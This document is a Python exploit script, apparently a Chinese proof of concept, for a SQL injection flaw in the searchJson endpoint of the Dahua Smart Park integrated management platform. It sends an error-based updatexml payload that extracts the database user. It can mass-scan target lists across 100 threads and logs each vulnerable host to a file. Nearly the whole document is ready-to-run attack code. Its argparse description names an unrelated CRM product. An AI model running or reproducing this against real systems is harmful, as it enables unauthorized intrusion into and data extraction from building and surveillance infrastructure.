#大华智慧园区综合管理平台 searchJson SQL注入漏洞

#

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
 _      _     ____  ____    ____  _      ____ 
/ \__/|/ \ /\/  __\/  _ \  /   _\/ \__/|/ ___\
| |\/||| | |||  \/|| / \|  |  /  | |\/|||    \
| |  ||| \_/||    /| |-||  |  \__| |  ||\___ |
\_/  \|\____/\_/\_\\_/ \|  \____/\_/  \|\____/
                                                                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="帮管客 CRM message")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D'
    url = target + url_payload
    header = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'If-Modified-Since': 'Tue, 11 Jun 2024 13:46:37 GMT',
        'Connection': 'close'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 500 and "XPATH syntax error" in res.text:
            print(f"f[+]该url存在SQL注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在SQL注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()